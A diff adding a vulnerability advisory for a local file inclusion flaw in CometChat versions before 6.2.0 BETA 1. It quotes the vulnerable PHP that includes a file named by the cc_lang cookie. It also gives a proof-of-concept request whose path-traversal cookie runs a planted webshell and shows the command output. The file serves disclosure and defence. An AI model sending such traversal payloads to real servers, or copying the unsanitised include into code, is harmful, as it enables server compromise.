@@ -1,0 +1,60 @@
+# Exploit Title: CometChat < v6.2.0 BETA 1 - Local File Inclusion
+# Date: 2017-10-22
+# Exploit Author: Luke Paris (Paradoxis) <luke@paradoxis.nl>
+# Vendor Homepage: https://cometchat.com/
+# Version: < 6.2.0 BETA 1
+# Tested on: Ubuntu Linux 14.04
+#
+# --------------------------------------------------------------------------------------
+#
+# In versions of CometChat before version v6.2.0 BETA 1 a bug existed which allowed
+# any unauthorised attacker to modify the include path of a php file by sending an
+# HTTP request with a crafted 'cc_lang' cookie.
+#
+# If successfully exploited an attacker could leverage this bug to execute arbitrary PHP
+# code which resides somewhere else on the server (eg: uploaded via an upload form).
+#
+# Due to the fact that this bug resides in the configuration file of the applications
+# it might be possible that future versions of the chat application still contain the
+# file inclusion bug as the script might have been re-applied after an update.
+#
+# --------------------------------------------------------------------------------------
+#
+# The vulnerability resides in the application's configuration file, near the beginning 
+# of the script the following code block is executed, this is where an attacker is able 
+# to inject a string into the cc_lang cookie.
+
+/* COOKIE */
+$cookiePrefix = 'cc_';
+
+/* LANGUAGE START */
+$lang = 'en';
+
+/* LANGUAGE END */ 
+if (!empty($_COOKIE[$cookiePrefix."lang"])) {
+    $lang = $_COOKIE[$cookiePrefix."lang"];
+}
+
+# Near the end of the configuration file, the following code block is executed.
+# This is where the exploit is triggered by not sanitising the $lang variable properly.
+
+include dirname(__FILE__).DIRECTORY_SEPARATOR.'lang'.DIRECTORY_SEPARATOR.'en.php';
+if (file_exists(dirname(__FILE__).DIRECTORY_SEPARATOR.'lang'.DIRECTORY_SEPARATOR.$lang.'.php')) {
+    include dirname(__FILE__).DIRECTORY_SEPARATOR.'lang'.DIRECTORY_SEPARATOR.$lang.'.php';          
+}
+
+# The following example demonstrates how an attacker could leverage this bug to gain control 
+# over the server, which could result in a full server compromise (assuming the attacker has
+# already managed to write a webshell to the servers' disk somehow): 
+
+GET /cometchat/config.php?cmd=id HTTP/1.1
+Host: example.com
+Connection: keep-alive
+Cookie: cc_lang=../../uploads/evil
+
+HTTP/1.1 200 OK
+Host: example.com
+Connection: close
+Content-type: text/html; charset=UTF-8
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
